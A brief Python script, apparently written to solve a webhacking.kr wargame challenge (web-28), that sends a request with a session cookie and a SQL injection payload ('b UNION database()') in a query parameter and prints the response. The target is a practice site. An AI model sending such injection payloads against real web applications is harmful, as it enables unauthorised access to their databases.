import requests
# import hashlib
import time


URL = "https://webhacking.kr/challenge/web-28/"
SESSION_ID = "1234"
cookies = {'PHPSESSID':SESSION_ID}
params ={'val':"b UNION database()", 'answer':''}

response = requests.get(URL, params=params, cookies=cookies)
print(response.text)

